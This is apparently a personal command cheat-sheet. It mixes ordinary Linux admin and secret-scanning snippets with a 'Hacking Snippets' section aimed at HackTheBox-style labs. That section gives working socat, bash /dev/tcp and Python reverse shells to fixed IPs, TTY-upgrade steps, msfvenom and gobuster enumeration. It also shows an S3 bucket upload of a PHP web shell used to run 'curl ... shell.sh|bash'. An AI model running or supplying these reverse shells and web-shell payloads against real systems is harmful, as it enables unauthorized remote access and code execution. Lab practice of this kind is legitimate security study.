
### Linux Version
```
# The following commands can all find os name and version in Linux:
cat /etc/os-release
lsb_release -a
hostnamectl

# Find Linux kernel version
uname -r 
```
`usermod -aG sudo <USERNAME>  # add <USERNAME> to the sudoers group` 


Create a webserver with node
`npx http-server -p 9999`


Disable the CSS by pasting the following into the dev tools console
`var el = document.querySelectorAll('style,link'); for (var i=0; i<el.length; i++) {el[i].parentNode.removeChild(el[i]);};`


`brew install mitmproxy`
`pip3 install mitmproxy2swagger # Plugin to scrape an api of all its endpoints`


CMD: `zip -r <FILETOEXTRACT> $(find /opt/ibm/isim/ -name "*.jar")`


`grep MemTotal /proc/meminfo` - Get the total ram/Memory of the system


`for i in $(compgen -a); do alias $i ; done` # List all the aliases and the see what commmands they actually do



`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` # List of all SUID and SGID Executables - from : https://atom.hackstreetboys.ph/linux-privilege-escalation-suid-sgid-executables/



`watch -n 60 "date && free -h"` # Run two commands in watch at the same time every 60 seconds


### Regexes for vs code

`password(.*)"(.*)"`# find the term "password" followed by anything and then a pair of quotations marks with text within them
`auth(.*)"(.*)"`# find the term "auth" followed by anything and then a pair of quotations marks with text within them


`detect-secrets -C . scan > .secrets.basline` # Run detect secrts and make a basline file for the repo
`detect-secrets audit .secrets.baseline`

`trufflehog --regex <FULLPATHTOCODE>`


# HAcking Snippets



```
python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/sh")'
export TERM=xterm
ctl Z # abckgroun the terminal
stty raw -echo
fg + Enter # to Forground
--------------------------------------------
SO CAT SHELL

Reverse Shell
Victim Linux: socat exec:'bash -li',pty,stderr,setidsigint,sane tcp:10.10.16.2:1234
Victim Windows: socat TCP4:192.168.1.1:4443 EXEC:'cmd.exe',pipes
Attacker: socat file:`tty`,raw,echo=0 tcp-listen:1234

-------------Simple server python 3 
python3 -m http.server 9999
--------------------
tcpdump -i tun0 icmp 					# opens a listerner for incoming pings
--------------------------
msfvenom -l payload | grep node 			# look for node payloads
msfvenom -p
----------
bash -i >& /dev/tcp/10.10.16.2/9001 0>&1

echo 'import socket,os,pty;' >> script3.py 
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> script3.py 
echo 's.connect(("10.10.16.2",4242));' >> script3.py 
echo 'os.dup2(s.fileno(),0);' >> script3.py 
echo 'os.dup2(s.fileno(),1);' >> script3.py 
echo 'os.dup2(s.fileno(),2);' >> script3.py 
echo 'pty.spawn("/bin/sh")' >> script3.py 

-------
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts  # add infor to osts file
----------------------------
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -u http://thetoppers.htb # subdomain enumeration

Where... 
vhost : Uses VHOST for brute-forcing
-w : Path to the wordlist
-u : Specify the URL

Note: If using Gobuster version 3.2.0 and above we also have to add the --append-domain flag to our
command so that the enumeration takes into account the known vHost ( thetoppers.htb ) and appends it
to the words found in the wordlist ( word.thetoppers.htb ).

-------S3

└─# aws configure 				#  using an arbitrary value for all the fields, as sometimes the server is configured to not check authentication (still, it must be configured to something for aws to work).               
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp

aws --endpoint=http://s3.thetoppers.htb s3 ls # list all of the S3 buckets hosted by the server
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb  #se the ls command to list objects and common prefixes under the specified bucket.
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.105:8000/shell.sh|bash

```
